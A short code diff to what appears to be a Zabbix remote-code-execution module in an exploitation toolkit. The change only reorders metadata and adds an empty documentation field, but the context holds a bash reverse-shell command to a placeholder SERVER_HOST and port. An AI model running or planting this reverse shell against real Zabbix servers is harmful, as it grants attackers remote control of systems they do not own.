@@ -2,12 +2,13 @@ from core.utils import *
 import logging
 import urllib.parse as urllib
 
-name        = "zabbix"
-description = "Zabbix RCE"
-author      = "Swissky"
-
 # Note
 # Require `EnableRemoteCommands = 1` on the Zabbix service
+
+name          = "zabbix"
+description   = "Zabbix RCE"
+author        = "Swissky"
+documentation = []
 
 class exploit():
     cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"
